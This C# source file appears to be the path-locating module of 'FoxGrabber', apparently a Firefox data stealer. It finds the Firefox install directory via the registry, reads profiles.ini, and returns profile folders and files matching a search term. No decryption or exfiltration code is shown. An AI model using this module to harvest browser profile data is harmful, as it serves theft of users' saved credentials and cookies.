namespace FoxGrabber
{
    using Microsoft.Win32;
    using System;
    using System.IO;

    public class MozPath
    {
        private static readonly string DirectoryMozilla = @"SOFTWARE\Mozilla\Mozilla Firefox";
        private static readonly string AppDataFireFox = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Mozilla\Firefox\profiles.ini");
        public static readonly string CheckFileIni = File.ReadAllLines(AppDataFireFox)[6].Split('=')[1]; // автоматическое нахождение через файл profiles.ini
        private static readonly string LocalFireFoxDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Mozilla\Firefox\Profiles");

        public static string GetRegistryFireFox(string Inst = "Install Directory", string SubDir = "Main", bool Recursive = true)
        {
            using (var KeyH = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, (Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32)))
            {
                using (RegistryKey Key = KeyH.OpenSubKey(DirectoryMozilla, Recursive))
                {
                    return Key?.OpenSubKey(Key?.GetSubKeyNames()[0]).OpenSubKey(SubDir)?.GetValue(Inst)?.ToString();
                }
            }
        }

        public static string FullPath => GetRegistryFireFox();

        public static DirectoryInfo GetLocationFireFox()
        {
            if (!Directory.Exists(LocalFireFoxDir))
            {
                return null;
            }
            return new DirectoryInfo(LocalFireFoxDir).GetDirectories().Length == 0 ? null : new DirectoryInfo(LocalFireFoxDir).GetDirectories()[0];
        }

        public static string GetRandomFF()
        {
            if (!Directory.Exists(LocalFireFoxDir))
            {
                return null;
            }
            return Directory.GetDirectories(LocalFireFoxDir)[0];
        }

        public static FileInfo GetFile(DirectoryInfo profilePath, string searchTerm) => 
            profilePath.GetFiles(searchTerm).Length == 0 ? null : profilePath.GetFiles(searchTerm)[0];

        public static bool IsFirefoxInstalled => GetRandomFF() != null;
    }
}